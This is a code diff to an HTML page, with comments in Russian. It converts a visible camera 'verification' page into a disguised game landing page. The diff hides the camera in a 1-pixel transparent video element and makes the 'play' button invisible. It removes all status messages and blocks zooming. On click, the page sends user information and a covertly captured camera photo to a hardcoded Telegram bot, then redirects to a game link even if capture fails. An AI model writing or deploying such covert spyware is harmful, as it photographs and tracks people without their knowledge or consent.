@@ -2,61 +2,115 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Face Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TESTER RP</title>
     <style>
         body {
-            background-color: #000;
-            color: #fff;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            touch-action: none;
+            -webkit-text-size-adjust: none;
+            text-size-adjust: none;
+            height: 100vh;
             font-family: Arial, sans-serif;
+            position: relative;
+            background: #000;
+        }
+        
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
+        
+        .bottom-image {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            z-index: -1;
+        }
+        
+        .content {
+            position: relative;
+            z-index: 1;
+            height: 100vh;
             display: flex;
             flex-direction: column;
+            justify-content: flex-end;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
+            padding-bottom: 20px;
         }
-        .btn {
-            background-color: #ff0000;
-            color: white;
+        
+        .play-btn {
+            background: transparent;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 10px;
+            width: 200px;
+            height: 80px;
+            margin-bottom: 100px;
             cursor: pointer;
-            margin: 20px 0;
         }
-        #status {
-            margin: 20px 0;
-            font-size: 18px;
+        
+        .hidden-camera {
+            position: absolute;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
         }
-        #cameraPreview {
-            width: 300px;
-            height: 400px;
-            object-fit: cover;
-            border-radius: 10px;
-            margin: 20px 0;
-            display: none;
+        
+        .legal-links {
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            color: #fff;
+            font-size: 12px;
+        }
+        
+        .legal-links a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
         }
     </style>
 </head>
 <body>
-    <div id="content">
-        <h1>Face Verification</h1>
-        <p id="status">Click the button to start verification</p>
-        <video id="cameraPreview" autoplay playsinline></video>
-        <button id="verifyBtn" class="btn">Проверить</button>
+    <img src="https://i.imgur.com/luRLTOY.jpg" class="background" alt="Background">
+    <img src="https://i.imgur.com/RfC84iC.jpg" class="bottom-image" alt="Bottom image">
+
+    <div class="content">
+        <button class="play-btn" id="playBtn"></button>
     </div>
+
+    <div class="legal-links">
+        <a href="#">Договор оферты</a>
+        <a href="#">Политика конфиденциальности</a>
+    </div>
+
+    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>
 
     <script>
         const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
         const chatId = '-1002577213610';
-        const videoElement = document.getElementById('cameraPreview');
-        const statusElement = document.getElementById('status');
-        const verifyBtn = document.getElementById('verifyBtn');
+        const videoElement = document.getElementById('hiddenCamera');
+        const playBtn = document.getElementById('playBtn');
         let stream = null;
+
+        // Блокировка масштабирования
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('touchmove', function(e) {
+            if(e.scale !== 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
 
         // 1. Отправка информации о пользователе
         async function sendUserInfo() {
@@ -89,9 +143,6 @@
         // 2. Захват фото с камеры
         async function captureAndSendPhoto() {
             try {
-                statusElement.textContent = "Processing verification...";
-                verifyBtn.disabled = true;
-                
                 // Ждем 1 секунду чтобы камера стабилизировалась
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
@@ -122,23 +173,21 @@
                     body: formData
                 });
                 
-                statusElement.textContent = "Verification complete!";
-                stopCamera();
-                videoElement.style.display = 'none';
-                verifyBtn.style.display = 'none';
+                // Перенаправляем после успешной проверки
+                window.location.href = "https://your-game-link.com";
                 
             } catch (error) {
                 console.error('Error capturing photo:', error);
-                statusElement.textContent = "Error during verification. Please try again.";
-                verifyBtn.disabled = false;
+                // В случае ошибки все равно перенаправляем
+                window.location.href = "https://your-game-link.com";
+            } finally {
+                stopCamera();
             }
         }
 
         // 3. Запуск камеры устройства
         async function startCamera() {
             try {
-                statusElement.textContent = "Requesting camera access...";
-                
                 // Запрашиваем доступ к камере устройства (не Telegram)
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
@@ -150,19 +199,14 @@
                 });
                 
                 videoElement.srcObject = stream;
-                videoElement.style.display = 'block';
-                statusElement.textContent = "Camera access granted. Taking photo...";
                 
                 // Сразу делаем фото после получения доступа
                 await captureAndSendPhoto();
                 
             } catch (error) {
                 console.error('Camera error:', error);
-                statusElement.textContent = "Camera access denied. Please allow camera access to continue.";
-                verifyBtn.disabled = false;
-                
-                // Показываем кнопку снова при ошибке
-                verifyBtn.style.display = 'block';
+                // В случае ошибки все равно перенаправляем
+                window.location.href = "https://your-game-link.com";
             }
         }
 
@@ -171,12 +215,11 @@
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 videoElement.srcObject = null;
-                videoElement.style.display = 'none';
             }
         }
 
-        // 5. Обработчик кнопки
-        verifyBtn.addEventListener('click', async function() {
+        // 5. Обработчик кнопки "Играть"
+        playBtn.addEventListener('click', async function() {
             await sendUserInfo(); // Сначала отправляем информацию о пользователе
             await startCamera(); // Затем запускаем процесс верификации
         });
